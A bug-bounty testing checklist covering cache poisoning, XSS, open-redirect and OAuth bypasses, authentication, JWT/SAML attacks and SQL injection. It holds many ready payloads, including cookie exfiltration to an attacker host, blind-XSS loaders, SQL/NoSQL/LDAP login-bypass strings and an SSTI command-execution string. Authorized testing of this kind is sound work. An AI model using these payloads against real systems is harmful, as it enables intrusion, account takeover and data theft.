# Web Bug Based Checklist

<details>

<summary>WCD/WCP</summary>

### 0. Setup & Cacheability

* [ ] Confirm response is cached: check `X-Cache`, `Cf-Cache-Status`, `Age`, `X-Cache-Hits`
* [ ] Send the request twice — does it flip `miss` → `hit`?
* [ ] Add a cache buster so every test request has a unique cache key
* [ ] Read `Cache-Control` / `Pragma` / `Vary` on the response
* [ ] Note which inputs are keyed vs unkeyed (Akamai: `Pragma: akamai-x-get-true-cache-key`)
* [ ] Enable debug headers: Akamai `Pragma: akamai-x-check-cacheable, akamai-x-cache-on` / Fastly `Fastly-Debug: 1`
* [ ] Check how the CDN treats 4xx/5xx (default error caching → DoS potential)

### 1. Unkeyed Header Fuzzing (poisoning)

* [ ] `X-Forwarded-Host` (Title-Case)
* [ ] `X-FORWARDED-HOST` (UPPERCASE)
* [ ] `x-forwarded-host` (lowercase)
* [ ] `X_Forwarded_Host` (dash → underscore)
* [ ] `X-Forwarded-Host :` (space before colon)
* [ ] Double header — send `X-Forwarded-Host` twice
* [ ] `X-Forwarded-Scheme` / `X-Forwarded-Proto`
* [ ] `X-Host` / `X-Original-URL` / `X-Rewrite-URL`
* [ ] `Forwarded`
* [ ] Bulk header wordlist (rate-limited: 1 req/sec, \~50 headers/req)

### 2. Unkeyed Cookie Fuzzing (poisoning)

* [ ] Fuzz for hidden/unkeyed cookie parameters
* [ ] Check if any cookie is reflected into the cached response

### 3. Unkeyed / Excluded Query Param Fuzzing (poisoning)

* [ ] Tracking params: `utm_.*` `gclid` `gdftrk` `_ga` `mc_.*` `trk_.*` `dm_i` `_ke` `sc_.*` `fbclid`
* [ ] Framework param: `_method`
* [ ] Bulk query wordlist (rate-limited: 1 req/sec, \~50 params/req)
* [ ] Test excluded param reflected → XSS
* [ ] Test excluded `_method` → DoS / logic change

### 4. Request Shape Discrepancies (poisoning)

* [ ] Fat GET — GET with a body the origin reads but cache ignores
* [ ] Cache-key normalization — `%2F`, casing, dot-segments decoded differently by cache vs origin
* [ ] Header-size discrepancy (origin limit < cache limit → cacheable error)
* [ ] Invalid header (`\:`, `Connection: Host`, `Upgrade: BB`) → cacheable error

### 5. Static-Extension Deception

* [ ] `path/account.css`
* [ ] `path/account.js`
* [ ] `path/account/nonexistent.css`
* [ ] `path/account/test.js` (trailing-path variant → 200)
* [ ] Less-common ext: `.avif` `.webp` `.svg` `.ico` `.woff2` `.map`
* [ ] Mind Cloudflare Cache Deception Armor (Content-Type must match ext)
* [ ] Test origin returning NO `Content-Type` header

### 6. Path-Prefix Caching

* [ ] Check if CDN caches `/path/*` or `/static/*` or `*.ext`
* [ ] Route a sensitive endpoint through the cached prefix

### 7. Path Traversal

* [ ] `../`
* [ ] `..%2F`
* [ ] `%2E%2E%2F`
* [ ] Double-encoded / Unicode variants (WAF bypass)

### 8. Delimiter Discrepancies (deception)

* [ ] `;`
* [ ] `%00`
* [ ] `%0d`
* [ ] `%0a`
* [ ] `%09`
* [ ] `?` `#` `&` `!`
* [ ] Full `%00`–`%FF` sweep
* [ ] Encoded-percent variants:
  * [ ] `user\xFUZZ` / `user\xFUZZ.js`
  * [ ] `user%FUZZ` / `user%FUZZ.js`
  * [ ] `user%25%FUZZ` / `user%25%FUZZ.js`
  * [ ] `user%25%25%FUZZ` / `user%25%25%FUZZ.js`
  * [ ] `user%FUZZ%FUZZ` / `user%FUZZ%FUZZ.js`

### 9. Chains

* [ ] Delimiter + path traversal → cache deception
* [ ] `/static/..%2Faccount%3Bx.css`
* [ ] `/assets/..%2F..%2Fapi%2Fme%00.js`
* [ ] Self-bug (self-XSS) + deception → stored XSS for others

### 10. Path-Confusion Payloads (deception)

* [ ] `example.com/nonexistent.css`
* [ ] `example.com/%0Anonexistent.css`
* [ ] `example.com/%3Bnonexistent.css`
* [ ] `example.com/%23nonexistent.css`
* [ ] `example.com/%3Fname=val nonexistent.css`

### 11. Advanced / Theoretical (DoS)

* [ ] HTTP version not in cache key → DoS
* [ ] FE/BE header-parsing discrepancy → DoS
* [ ] HTTP/2 downgrade → DoS

### 12. Confirm Impact

* [ ] Unkeyed header reflected → Stored XSS
* [ ] Unkeyed header in redirect → Stored Open Redirect
* [ ] Excluded query reflected → Stored XSS
* [ ] Cacheable error/empty/bad status → DoS
* [ ] Sensitive endpoint cached → token/PII/CSRF-token theft → ATO
* [ ] Verify victim (no cache buster) receives the poisoned/cached response
* [ ] If cached ≤5s, use Intruder NULL payloads to hold the key for PoC

</details>

<details>

<summary>XSS / HTML</summary>

### 0. Find Reflection / Sink Points

* [ ] `echo "domain.com" | gau | kxss | grep ">"` (reflected params)
* [ ] gau/waymore → collect URLs → test reflection
* [ ] Dork endpoints: `ext:php|asp|aspx|jsp|pl|cfm|py|rb|html`
* [ ] Walk every feature in Burp/ZAP, test each param for reflection (Reflector ext)
* [ ] Param discovery: Param-Miner, Arjun → test reflection of discovered params
* [ ] Check reflection in: query params, POST body, JSON fields, headers, cookies, path
* [ ] Note **how many times** and **where** the marker reflects (multiple sinks differ)

***

### 1. Identify the Reflection Context

* [ ] HTML body (between tags) → tag injection
* [ ] HTML tag attribute (quoted `"`/`'` or unquoted) → break out / event handler
* [ ] Inside `<script>` block → break JS string / statement
* [ ] Inside HTML comment `<!-- -->`
* [ ] Inside `<title>`/`<textarea>`/`<noscript>`/`<style>` (RAWTEXT/RCDATA) → needs closing tag
* [ ] URL/href/src attribute → `javascript:` scheme
* [ ] JSON response (and what chars are forbidden, e.g. `{}`)
* [ ] `<input type=hidden>` / `<link>` attribute → `accesskey` trick
* [ ] Markdown / rich-text editor
* [ ] Determine encoding applied (HTML-entity? URL? none?) — dictates payload

***

### 2. HTML Injection (no JS yet)

* [ ] `88<h1>POC</h1>88` (basic tag injection)
* [ ] `<iframe src=https://google.com></iframe>`
* [ ] Double/entity-encoded variants (`%253Ch1%253E`, `&#60;h1&#62;`) to test decode layers
* [ ] Inject a `<form>` (credential-harvest overlay)
* [ ] Open redirect: `<meta http-equiv="refresh" content="0;url=//attacker">`
* [ ] Open redirect: `<a href=//attacker><font size=100>click</font></a>`
* [ ] Set-Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">`
* [ ] Dangling-markup secret theft: `<img src='//attacker/?` (unclosed)
* [ ] CSS exfil: `<style>@import//attacker?` / `<table background='//collab?'`
* [ ] Form hijack: inject `<form action=//attacker>` before a real form
* [ ] `<noscript>` form overlay
* [ ] Portal tag: `<portal src='//attacker?`
* [ ] PasteJacking (hidden span with payload)
* [ ] HTML→SSRF: `<iframe src=//site/redirect.php?link=file:///etc/passwd>`

***

### 3. Inject an Event Handler

* [ ] WAF probe: inject `<x` → does it reach an event-handler position?
* [ ] `onxxx=yyy` — find how many `x` it accepts, adjust tag accordingly
* [ ] Agnostic handlers (tag-independent): `onblur`, `onclick`, `onmouseover`, `oncopy`, `oncut`, `onpaste`, `oninput`, `onkeydown`, `oncontextmenu`, `ondblclick`, `ondrag`
* [ ] `contenteditable` + `onblur`/`onfocus`/`oninput`/`onkeydown` (no interaction tricks)
* [ ] Auto-trigger: `onfocus + autofocus`, `style=font-size:500px onmouseover`
* [ ] Brute-force the full handler list (PortSwigger cheat-sheet) when filtered

***

### 4. XSS Without Event Handlers

* [ ] `href`: `<a href=javascript:alert(1)>click`
* [ ] `action`: `<form action=javascript:alert(1)><input type=submit>`
* [ ] `formaction`: `<form><button formaction=javascript:alert(1)>click`
* [ ] `data`: `<object data=javascript:alert(1)>`
* [ ] `srcdoc`: `<iframe srcdoc=...>`
* [ ] `xlink:href`: `<svg><script xlink:href=data:,alert(1)></script>`
* [ ] SVG `<animate>` from `javascript:` URL
* [ ] `<math><brute href=javascript:alert(1)>`

***

### 5. Inject JS / Confirm Execution

* [ ] `'"--><svg onload=alert(1)>` (break-out polyglot)
* [ ] `"'-->aaaaa<h1 onclick=alert(1)>` (context escape)
* [ ] `<img src=x onerror=alert(1)>`
* [ ] `<script>alert(document.domain)</script>`
* [ ] `<svg/onload=prompt(document.cookie)>`
* [ ] `<input/onauxclick="[1].map(prompt)">`
* [ ] `<body onbeforescriptexecute="[1].map(confirm)">`
* [ ] base64 eval: `<img src=x onerror=eval(atob('...'))>`
* [ ] popover: `<button popovertarget=x>..<input popover id=x onbeforetoggle=alert(document.cookie)>`
* [ ] Confirm with `document.domain` (proves origin) not just `alert(1)`

***

### 6. Polyglots (context-agnostic one-shots)

* [ ] `jaVasCript:/*-/*`/_\`/_'/_"/\*\*/(/_ \*/oNcliCk=alert() )//%0D%0A...\<sVg/oNloAd=alert()//>\`
* [ ] `'">><marquee><img src=x onerror=confirm(1)></marquee>...<script>prompt(1)</script>`
* [ ] `';alert(String.fromCharCode(88,83,83))//...</SCRIPT>">'><SCRIPT>...`
* [ ] Jhaddix / RSnake / Mario master polyglot strings

***

### 7. Blind XSS (stored, fires elsewhere)

* [ ] Plant in: name fields, support tickets, user-agent, referer, contact forms, image uploads
* [ ] `"><script src=//xss.report/s/XXXX></script>`
* [ ] `<img src=x id=<base64> onerror=eval(atob(this.id))>` (CSP/lenient sinks)
* [ ] XSS Hunter / xss.report / js.rip listener
* [ ] Burp Collaborator client for blind callbacks

***

### 8. DOM XSS

* [ ] Identify sources→sinks: `location`, `document.URL`, `referrer`, `postMessage`, cookie → `innerHTML`, `document.write`, `eval`, `setTimeout`, `src`
* [ ] Hash/query-driven sinks: `#payload`, `?param=`
* [ ] `postMessage` listener with no origin check → frame it and post payload
* [ ] `JSON.parse`-based message handling
* [ ] DOM cookie manipulation
* [ ] DOM clobbering to enable XSS / bypass HTML filters
* [ ] Swagger-UI: `?configUrl=`/`?url=` pointing to attacker JSON/YAML
* [ ] AngularJS template injection: `{{constructor.constructor('alert(1)')()}}`

***

### 9. Filter / WAF Bypass

* [ ] Case toggle: `<sCRipT>`, `<Svg/OnLoad>`
* [ ] Null byte / junk: `<scr\x00ipt>`, recursive `<scr<script>ipt>`
* [ ] Whitespace alts: `<svg·onload>`, `&Tab;`, `%0a`, `/**/`
* [ ] Encoding layers: URL, double-URL, unicode `\u0061`, hex `\x61`, HTML entities, `String.fromCharCode`
* [ ] Code-eval keyword bypass: `eval('ale'+'rt(1)')`, `Function('alert(1)')()`, `setTimeout('...')`, `Set.constructor`...
* [ ] `.JSON`/`.html` bypass: `...redacted.json//%3Csvg onload=...%3E.html`
* [ ] `<meta>` tag injection / ASP.NET ResolveUrl `~/(A(...))/` trick
* [ ] SVG-context WAF bypass (`xlink:href` entity-encoded)
* [ ] Markdown XSS: `[a](javascript:prompt(document.cookie))`, base64 `data:` link
* [ ] Email-field XSS: `"<svg/onload=alert(1)>"@x.y`, `["');alert(1)//"]@x.x`
* [ ] Per-WAF strings (Cloudflare/Akamai/Incapsula/Imperva/Sucuri/ModSecurity/F5/PHP-IDS/WebKnight)

***

### 10. File-Based & Header-Based

* [ ] Upload `.svg` with embedded `<script>alert()</script>`
* [ ] Polymorphic image (valid image + JS) for `<script src=img>` contexts
* [ ] File-upload **filename** as payload (intercept, rename to `<img onerror>`)
* [ ] RFI→XSS: `php?=//attacker/poc.svg`
* [ ] Host/header injection: `Host: bing.com"><script>alert(document.domain)</script>`
* [ ] Reflected XSS via HTTP request smuggling (front-end/back-end desync)

***

### 11. Escalation / Impact

* [ ] Cookie theft: `<script>new Image().src='//attacker/?'+document.cookie</script>` (needs non-HttpOnly)
* [ ] Token theft: `...+localStorage.getItem('access_token')`
* [ ] XSS→ATO via fetch to `/account` + exfil to Collaborator
* [ ] Self-XSS → reflected: save response as `.html`, confirm it executes
* [ ] Self-XSS + CORS misconfig → ATO (fetch authed API, exfil response)
* [ ] XSS→CSRF: fetch CSRF token from page, submit state-changing request
* [ ] XSS→SSRF: `<esi:include src=//internal>` / iframe to internal
* [ ] XSS→LFI: `XMLHttpRequest` GET `file:///etc/passwd` → `document.write`
* [ ] XSS→RCE (admin panels / desktop-app webviews)
* [ ] Phishing: inject `<iframe src=//attacker>` / fake login form
* [ ] Defacement / forced open-redirect
* [ ] Re-verify on clean session; record param, context, sink, and stored-vs-reflected

***

### Tooling

* [ ] kxss + gau/waymore (reflection discovery)
* [ ] Param-Miner, Arjun (hidden params)
* [ ] Burp Reflector / Reflect, Burp Collaborator
* [ ] XSS Hunter / xss.report / js.rip (blind)
* [ ] DalFox / XSStrike (automated fuzz) ; PortSwigger & Brute Logic cheat-sheets

</details>

<details>

<summary>OR &#x26; SSRF</summary>

{% code overflow="wrap" %}
```
me.com\@www.target.com
target.com\@me.com
me.com/.www.target.com
target.com/@me.com
me.com\[target.com]
me.com%ff@target.com%2F
me.com%bf:@target.com%2F
me.com%252f@target.com%2F
//me.com%0a%2523.target.com
me.com://target.com
androideeplink://me.com\@target.com
androideeplink://a@target.com:@me.com
androideeplink://target.com
target.com.me.com\@target.com
target.com%252f@me.com%2fpath%2f%3
//me.com:%252525252f@target.com
target.com.evil.com
evil.com#target.com
evil.com?target.com
/%09/me.com
me.com%09target.com
me.com\u0000@target.com
me.com%00target.com
/\me.com
me.comğ.target.com
me.com\udfff@target.com
me.com?.target.com
me.com@target.com
auspost.com.au.target.com
growanzXtarget.com
target.com/auspost.com.au
target.com%23@auspost.com.au
target.com%25%32%33@auspost.com.au
email=me@`whoami`.id.collaborator.net&
target.com@%E2%80%AE@me.com
evil.com/test@target.com
evil.com@target.com
redirect_to=////evil%E3%80%82com
evil.com%bf:@target.com
evil.com\@target.com
me.com/test@target.com
me.com%09company.com           # kept original-style pct/tab test (mapped host context)
me.com%00company.com          # null-byte style variant (mapped)
/\x08/evil.com
[test](/\x08/evil.com
```
{% endcode %}

</details>

<details>

<summary>OAuth</summary>

### 0. Map the Flow First

* [ ] Capture the authorization request: `GET /auth?client_id=...&redirect_uri=...&scope=...&state=...&response_type=code`
* [ ] Note the grant type (code / implicit / token), and where the code/token lands
* [ ] Find the client's `/authenticate` (token-exchange / login) endpoint
* [ ] Identify which params are reflected, validated, or trusted (email, id, redirect\_uri, state, scope)
* [ ] Brute-force legacy/unimplemented flows (try `response_type=token`, `id_token`, etc.)
* [ ] Try changing request method (GET/POST/HEAD/PUT) to see routing differences

***

### 1. redirect\_uri Validation

* [ ] Swap to attacker domain → does it redirect (open redirect → code/token theft)?
* [ ] Path traversal: `/callback/../redirect?url=//evil` , `redirect_uri=https://target/../../redirect_uri=//evil`
* [ ] Weak regex: `https://target.com.evil.com`
* [ ] Subdomain/suffix: `target.com.evil.com`, `evil.com#target.com`, `evil.com?target.com`
* [ ] `//attacker.com` (scheme-relative)
* [ ] `https://attacker.com\@target.com`
* [ ] `https://attacker.com?@target.com`
* [ ] `https://target.com\@me.com` / `https://me.com\@target.com`
* [ ] CRLF: `attacker.com%0d%0atarget.com`
* [ ] Null/invisible bytes `%00`–`%FF`: `me.com%5btarget.com`, `me.com%ff@target.com%2F`
* [ ] Encoded slashes: `target.com%252f@me.com%2fpath`, `//me.com%252525252f@target.com`
* [ ] Deep-link schemes: `androideeplink://me.com\@target.com`
* [ ] Tab/newline: `/%09/me.com`, `me.com%09target.com`, `/\me.com`
* [ ] IDN homograph: `redirect_uri=https://www.cṍmpany.com`
* [ ] Open-redirect/SSRF elsewhere on site → chain to bypass redirect\_uri allowlist
* [ ] HTML injection / XSS via reflected redirect\_uri
* [ ] `data:` URI redirect → DOM XSS
* [ ] `javascript:` redirect\_uri in token exchange

***

### 2. state Parameter / CSRF

* [ ] No `state` param at all → login/linking CSRF
* [ ] Static `state` value (same every time) → reusable → CSRF
* [ ] Remove `state` and check if still accepted
* [ ] Predictable/guessable `state`
* [ ] Forced profile linking: drop the request, send the link to victim → their account links to attacker's social profile
* [ ] OAuth `state` null byte `%00` → bypass → 1-click ATO
* [ ] Is `state` actually tied to the user session?

***

### 3. scope Manipulation

* [ ] Remove `email` from scope → ATO/pre-ATO (account created without verified email)
* [ ] Modify Google `hd=` param (`company.com` → `gmail.com`) to connect non-org email
* [ ] Inject `admin@company.com` as email value in scope → extra privileges
* [ ] Access-token scope abuse: use token on elevated-scope endpoints
* [ ] SSTI in scope: `${T(java.lang.Runtime).getRuntime().exec("calc")}` → RCE

***

### 4. Email / Identity Trust — ATO Variants

> The core of OAuth ATO: the client trusts an email/identity the attacker controls.

* [ ] **Microsoft nOAuth:** set attacker MS account email to victim's → log into target as victim
* [ ] **Facebook OAuth misconfig:** Sign in with FB → "Edit Access" → uncheck email → logged in without email → set email to victim's (0-click)
* [ ] **Discord OAuth:** victim has email+pass on target; attacker makes a Discord account with victim's email (Discord skips email confirmation) → sign in with Discord → ATO
* [ ] **Auth0 misconfig (0-click):** victim signed up via Google; attacker signs up with victim's email+pass → takeover
* [ ] **1-click ATO:** register with victim's email+pass via provider; victim clicks the confirmation link → ATO (0-click if no confirmation)
* [ ] **Phone-number account (0-click):** sign up on 3rd party with phone (no email) → log into target → in settings add victim's email
* [ ] **Pre-ATO:** register target account with victim's email + attacker password; victim later OAuths in, linking to attacker creds
* [ ] **IDN/punycode email trust:** provider (e.g. GitLab) accepts homographed emails → 0-click ATO
* [ ] **OKTA SSO org-switch:** invite victim to attacker org, create Okta user with victim's email, log in as victim, switch to victim's org

***

### 5. Access-Token Attacks

* [ ] Use access token from YOUR app instead of victim app's token (no audience validation)
* [ ] **Token reuse:** grab a valid provider token from another app using the same provider, replay against target
* [ ] Token not bound to client (audience/azp not checked)
* [ ] Use OAuth token while logged in as a DIFFERENT provider user (shared token confusion — HackerOne #46485 pattern)
* [ ] Access token stored in browser history
* [ ] Token leaked in Referer header on navigation

***

### 6. Authorization-Code Attacks

* [ ] Reuse the authorization code more than once
* [ ] Code valid across different applications/clients
* [ ] Brute-force the code (short/guessable)
* [ ] Everlasting code (no short expiry) → wide attack window
* [ ] XSS in `code=` param if reflected: `code=,%2520alert(123))%253B//`
* [ ] Reuse code with XSS payload appended: `code=AuthCode<script>alert(1)</script>`
* [ ] Code/state leaked in Referer header

***

### 7. response\_mode / prompt Tricks

* [ ] `prompt=none` → silent flow, minimizes/eliminates user interaction (combine with other attacks)
* [ ] `response_mode=fragment` → code lands after `#` → leak via open redirect
* [ ] `response_mode=form_post` + XSS on auth server → steal code/state from the auto-POST form
* [ ] `response_mode=query` (default) baseline
* [ ] Post-auth redirect + login CSRF: open redirect + `response_mode=fragment` → victim's code goes to attacker site after `#`

***

### 8. Injection in OAuth Endpoints

* [ ] XSS in Connect/Callback: `/oauth/Connect?)%7D(alert)(location);%7B%3C!--&...`
* [ ] XSS via error trigger: `client_id=<marquee onfinish=prompt(document.domain)>`
* [ ] Add `.json`/`.xml` extension to endpoint (`/oauth/Connect.json`) → token may leak in response
* [ ] IDOR in `id=` param → change to victim's id → ATO
* [ ] SSTI in scope/params → RCE

***

### 9. SSRF via OpenID / Dynamic Client Registration

* [ ] Browse `/.well-known/openid-configuration` → find registration endpoint
* [ ] POST to register a client
* [ ] Test `logo_uri` for SSRF (read cloud metadata)
* [ ] Test other URI params (`jwks_uri`, `sector_identifier_uri`, `request_uri`)
* [ ] Proxy-page: use SSRF to steal tokens from metadata

***

### 10. Host / Referer Header Tricks

* [ ] `Host: me.com/www.company.com` (host confusion)
* [ ] `Host: www.company.com` with `Referer: https://me.com/path`
* [ ] Insert attacker domain in Referer to bypass referer-based checks

***

### 11. Race Conditions

* [ ] Send simultaneous requests on callback/OTP (Turbo Intruder)
* [ ] Race the code-exchange endpoint
* [ ] Provider-side race conditions (double-spend a code, concurrent linking)

***

### 12. postMessage Exploitation

* [ ] Find `postMessage(Msg,"*")` where `Msg = location.href.split("#")[1]`
* [ ] Confirm no `X-Frame-Options` on the page
* [ ] Frame the OAuth page with attacker `redirect_uri` → catch token via postMessage listener

***

### 13. Secrets

* [ ] `client_secret` leaked (in JS, mobile app, repo) → mint tokens
* [ ] Brute-force `client_secret` on `/token` endpoint
* [ ] Refresh token not bound to client / never expires / reusable

***

### 14. Provider-as-a-Service Side

* [ ] If target IS an OAuth provider: open redirect with punycode domain on the provider redirect
* [ ] Provider accepts IDN/homographed emails (email-trust 0-click)
* [ ] OAuth hijacking (intercept/relay the provider response)

</details>

<details>

<summary>Authentication</summary>

### 0. Recon & Quick Wins

* [ ] Read page source / HTML comments (scroll right too) for creds, hints, hidden fields
* [ ] Try directly accessing restricted pages (forced browsing) without auth
* [ ] Check `autocomplete="off"` missing on password/sensitive inputs
* [ ] Check Secure / HttpOnly flags on session cookies
* [ ] Look for token/password leaking in the URL
* [ ] Default credentials (root/admin/tech-name/default user) — DefaultCreds-cheat-sheet, SecLists
* [ ] Build a target-specific wordlist (h0tak88r casing/permutation script) + crunch
* [ ] Username enumeration via login / register / reset error differences
* [ ] GraphQL: many auth attempts batched in one request (rate-limit bypass)

***

### 1. Login Bypass — Email / Parameter Tricks

* [ ] `yourname@wearehackerone.com` / `@bugcrowd.com` variants
* [ ] Nested email: `lol@company.com@collaborator.net`
* [ ] Don't send the parameters — send none, or only one
* [ ] PHP type juggling: `user[]=a&pwd=b`
* [ ] PHP type juggling: `user=a&pwd[]=b`
* [ ] PHP type juggling: `user[]=a&pwd[]=b`
* [ ] Change Content-Type to JSON, send JSON values (include bool `true`)
* [ ] POST-not-supported → send JSON in body with **GET** + `Content-Type: application/json`
* [ ] Node.js parsing: `password[password]=1`
* [ ] Node.js JSON: `"password":{"password": 1}` (need a valid username)

***

### 2. Login Bypass — Injection

**SQL injection auth bypass** (try in username and password):

* [ ] `' or '1'='1`
* [ ] `' or ''='`
* [ ] `' or 1]%00`
* [ ] `' or /* or '`
* [ ] `' or "a" or '`
* [ ] `' or 1 or '`
* [ ] `' or true() or '`
* [ ] `admin' or '`
* [ ] `admin' or '1'='2`
* [ ] `'or string-length(name(.))<10 or'` (XPath)
* [ ] `'or contains(name,'adm') or'` (XPath)
* [ ] `'or position()=2 or'` (XPath)

**NoSQL injection auth bypass:**

* [ ] `username[$ne]=x&password[$ne]=x`
* [ ] `{"username":{"$ne":null},"password":{"$ne":null}}`
* [ ] `{"username":{"$gt":""},"password":{"$gt":""}}`
* [ ] `admin'||'1'=='1` (JS injection in NoSQL)

**LDAP injection auth bypass:**

* [ ] `*`
* [ ] `*)(&`
* [ ] `*)(|(&`
* [ ] `*)(|(*`
* [ ] `admin)(&)`
* [ ] `admin)(!(&(|`
* [ ] `pwd)` / `pwd))` variations

***

### 3. Password Handling & Logic

* [ ] Empty password (some accounts accept blank)
* [ ] Password-type attribute flip (e.g. `type=2 → type=1` cleartext) then brute
* [ ] Null/edge password values: `-1`, `0`, `9999999999`, empty
* [ ] Response manipulation: change `302`/fail → `200`/success
* [ ] Response manipulation: flip `false`→`true`, change `role`/`ID`/status code (PrevEsc)
* [ ] Burp Match & Replace to rewrite identity (`lol@sso.com → lol@gmail.com`)
* [ ] Changing authentication type to null
* [ ] Weak password policy (change/reset/register accept simple passwords)
* [ ] Password change without asking current password
* [ ] Email change without password confirmation

***

### 4. Session, Token & Endpoint Logic

* [ ] Refresh-token endpoint: remove `Authorization` header + change `username` → token for any user
* [ ] "Remember me" cookie: decode/forge for ATO; check it survives password change
* [ ] Improper MS SSO: oversized content-length on redirect leaks internal response → flip `302`→`200`, delete `Location`
* [ ] Auth bypass via subdomain takeover (cookie scoped to `.domain.com`)
* [ ] CMS portlet access (Liferay `p_p_id=58` → reach Create Account / hidden portlets)
* [ ] Spring Actuator endpoints exposed / broken auth
* [ ] Over-permissive "not-login token" reused on sensitive endpoints (TikTok-style)
* [ ] Token not scoped to app/audience — reused across endpoints/services

***

### 5. JWT — Triage (jwt\_tool first)

* [ ] `jwt_tool -M at -t <url> -rh "Authorization: Bearer <jwt>"` (all tests)
* [ ] **Required?** remove token — does request still succeed?
* [ ] **Checked?** delete last chars of signature — error / different / same?
* [ ] **Persistent?** replay same token after logout / 24h — still valid (immortal)?
* [ ] **Origin?** token first seen server-side, not client-side?
* [ ] **Claim order?** tamper a reflected payload claim, keep signature — processed?
* [ ] Sensitive data exposure in payload (decode it)

### 6. JWT — Signature & Key Attacks

* [ ] `alg:none` / `None` / `NONE` / `nOnE` + empty signature (`jwt_tool -X a`)
* [ ] Accept arbitrary signature / null signature (CVE-2020-28042)
* [ ] Strip signature entirely (`jwt_tool -X n`)
* [ ] Crack HMAC secret — hashcat `-m 16500` / `jwt_tool -C -d wordlist`
* [ ] RS256→HS256 algorithm confusion (sign with public key as HMAC secret)
* [ ] Algorithm confusion, no exposed key — `rsa_sign2n` / `sig2n` to recover key
* [ ] Find public key: `/jwks.json`, `/.well-known/jwks.json`, `/openid/connect/jwks.json`, `/api/keys`

### 7. JWT — Header Parameter Injection

* [ ] `jwk` — embedded key (Burp Embedded JWK / `jwt_tool -X i`, CVE-2018-0114)
* [ ] `jku` — point JWK Set URL to attacker-monitored server
* [ ] `kid` — path traversal `../../../../dev/null` + sign with null byte (`AA==`)
* [ ] `kid` — load known file (CSS/JS) as HMAC secret to verify
* [ ] `kid` — SQL injection (`xxxx' UNION SELECT 'aaa`)
* [ ] `kid` — command injection (`key.crt; whoami && ...`)
* [ ] `x5u` — attacker self-signed cert URL
* [ ] `x5c` — embedded attacker cert chain
* [ ] `x5t` / `cty` (try `cty: text/xml` or java-serialized → XXE/deser)

### 8. JWT — Claims & Misc

* [ ] `exp` — replay after expiry; check if token ever expires
* [ ] `nbf` — bypass not-before claim
* [ ] `jti` — replay when ID space too small / not enforced
* [ ] Cross-service relay — token from sibling client of same JWT service accepted?
* [ ] Example/sample token (Microsoft v1.0 id\_token) accepted (missing audience check)
* [ ] ATO from IDOR — swap user\_id in payload (leaked via wrong-password/reset response)

***

### 9. SAML

* [ ] Edit assertion (e.g. email → `admin@target`) **without** touching signature
* [ ] Remove the entire `<Signature>` (signature stripping)
* [ ] Remove only the `<SignatureValue>` value
* [ ] XML comment injection: register `admin<!--1-->@target` (parser strips comment)
* [ ] XML Signature Wrapping (XSW) — duplicate/move signed/unsigned assertions
* [ ] `ds:Reference URI` SSRF (PySAML2): `URI="http://attacker/?#id..."`
* [ ] CVE-2021-21239 — strip `SignatureValue`/`DigestValue`, re-sign with own key (xmlsec1)
* [ ] Mis-scoped SAML session — attacker-configured IdP (Okta) provisions victim email → SP issues victim session
* [ ] Replace recipient/destination/audience in assertion
* [ ] Reuse/replay a SAMLResponse (no one-time enforcement)

***

### 10. OTP / 2FA Bypass

* [ ] Omit the `code`/`otp` parameter entirely
* [ ] Send empty / null OTP value
* [ ] Response manipulation on OTP verify (`false`→`true`, `302`→`200`)
* [ ] Reuse a verify/2FA-setup token on a different action (unlink email/phone)
* [ ] 2FA can be disabled while logged in without re-entering password
* [ ] Brute force OTP (no rate limit) — Intruder, large window
* [ ] Race condition on OTP/verify endpoint
* [ ] 2FA not enforced on OAuth/social linking path
* [ ] Backup-code / recovery-flow weaker than primary 2FA

***

### 11. Confirm Impact

* [ ] Full ATO (login as victim)
* [ ] Pre-ATO (reserve victim identity before signup)
* [ ] Privilege escalation (user → admin via claim/role tamper)
* [ ] Auth bypass to sensitive data / internal endpoints
* [ ] Verify on a clean session / second account that the bypass reproduces
* [ ] Document exactly which control was skipped and what the attacker must supply

***

### Tooling

* [ ] `jwt_tool` (triage + forge), JWT Editor + JOSEPH Burp extensions
* [ ] `hashcat -m 16500` (JWT HMAC crack), JWT-Heartbreaker (weak-key detect)
* [ ] `rsa_sign2n` / `portswigger/sig2n` (recover public key for alg confusion)
* [ ] `xmlsec1` (SAML re-signing), SAML Raider Burp extension
* [ ] DefaultCreds-cheat-sheet, SecLists default passwords, crunch (wordlists)

</details>

<details>

<summary>SQL Injection</summary>

### 0. Map the Attack Surface (where to inject)

* [ ] **ID-based params** (`?id=`, `user_id`, `pid`) — most common
* [ ] Login form — username/email field
* [ ] Login form — password field
* [ ] Remember-me cookie value
* [ ] Session tokens
* [ ] OAuth callback parameters
* [ ] 2FA/MFA endpoints
* [ ] Search: main input, search API, advanced filters, autocomplete/typeahead
* [ ] Account recovery: forgot-password input, reset link, verification, username lookup
* [ ] Admin / CMS panels
* [ ] E-commerce: cart, checkout, payment callbacks, invoice gen, order-status lookup
* [ ] Profile/settings: edit endpoints, view-by-ID, notification prefs
* [ ] User content: comments, reviews/ratings, contact forms, support tickets
* [ ] List/filter controls: `page=`, `sort=`, `order=`, category dropdowns, date ranges
* [ ] **Non-obvious inputs:** HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies, JSON body fields, GraphQL args, file-upload names

***

### 1. Recon / Tooling Setup

* [ ] Burp Active Scan + Agartha extension on candidate requests
* [ ] Subdomains → crawl → `gf sqli urls >> sqli` → `sqlmap -m sqli --dbs --batch`
* [ ] Dork `.php`/likely-vuln paths → `Arjun` (param discovery) → `sqlmap`
* [ ] Identify request method, content-type, and which params echo into the response

***

### 2. Detection — Break the Query

* [ ] Single quote `'` → error / 500 / different response?
* [ ] Double quote `"`
* [ ] Backtick `` ` ``
* [ ] Two singles `''` (re-balance) → page returns to normal?
* [ ] Backslash `\`
* [ ] Math test: `?id=2-1` returns same as `?id=1` (numeric context)
* [ ] Boolean pair: `' AND '1'='1` (true) vs `' AND '1'='2` (false)
* [ ] Numeric boolean: `AND 1=1` vs `AND 1=2`
* [ ] Concatenation tests: `'||'`, `'+'`, `' '` (Oracle/MSSQL/MySQL differ)
* [ ] Comment terminators: `-- -`, `#`, `/*`, `;%00`

***

### 3. Identify Context & DBMS

* [ ] Determine context: numeric / single-quote string / double-quote / LIKE `%...%` / IN () / ORDER BY
* [ ] Fingerprint via error messages
* [ ] Version strings: `@@version` (MySQL/MSSQL), `version()` (PG/MySQL), `banner` (Oracle)
* [ ] Concatenation behavior: `CONCAT()` (MySQL) / `||` (PG/Oracle) / `+` (MSSQL)
* [ ] Comment style: `-- -` / `#` (MySQL) / `--` (PG/MSSQL/Oracle)
